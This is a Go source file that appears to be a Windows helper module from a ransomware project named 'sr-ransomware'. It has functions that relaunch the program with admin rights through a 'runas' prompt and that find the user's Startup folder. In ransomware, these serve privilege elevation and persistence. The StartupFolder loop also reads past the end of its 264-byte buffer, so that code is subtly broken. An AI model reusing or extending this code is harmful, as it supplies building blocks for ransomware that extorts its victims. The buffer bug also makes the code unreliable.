// +build windows

package win

import (
    "os"
    "unsafe"
    "syscall"

    "golang.org/x/sys/windows"
    "github.com/sug0/sr-ransomware/go/errors"
)

const (
    SW_HIDE            = 0
    SW_NORMAL          = 1
    SW_SHOWNORMAL      = 1
    SW_SHOWMINIMIZED   = 2
    SW_MAXIMIZE        = 3
    SW_SHOWMAXIMIZED   = 3
    SW_SHOWNOACTIVATE  = 4
    SW_SHOW            = 5
    SW_MINIMIZE        = 6
    SW_SHOWMINNOACTIVE = 7
    SW_SHOWNA          = 8
    SW_RESTORE         = 9
    SW_SHOWDEFAULT     = 10
    SW_FORCEMINIMIZE   = 11
)

var (
    shell32 = syscall.NewLazyDLL("Shell32.dll")
    isAdmin = shell32.NewProc("IsUserAnAdmin")
    folderP = shell32.NewProc("SHGetFolderPathA")
)

func ShellExecute(lpOperation, lpFile, lpParameters string, nShowCmd int) error {
    var param *uint16
    if lpParameters != "" {
        param = syscall.StringToUTF16Ptr(lpParameters)
    }
    err := windows.ShellExecute(
        0,
        syscall.StringToUTF16Ptr(lpOperation),
        syscall.StringToUTF16Ptr(lpFile),
        param,
        nil,
        int32(nShowCmd))
    return errors.WrapIfNotNil(pkg, "shell exec failed", err)
}

func IsUserAnAdmin() bool {
    isAdmin, _, _ := syscall.Syscall(isAdmin.Addr(), 0, 0, 0, 0)
    return isAdmin == 1
}

func RunAsAdmin() {
    if !IsUserAnAdmin() {
        ShellExecute("runas", `"`+os.Args[0]+`"`, "", SW_SHOW)
        os.Exit(0)
    }
}

func StartupFolder() string {
    buf := make([]byte, 264) // align to 64 bit
    ok, _, _ := syscall.Syscall6(folderP.Addr(), 5,
        0,
        7, // startup
        0,
        0,
        uintptr(unsafe.Pointer(&buf[0])),
        0)
    if ok != 0 {
        return ""
    }
    for i := 0; i < 512; i++ {
        if buf[i] == 0 {
            return string(buf[:i])
        }
    }
    return ""
}
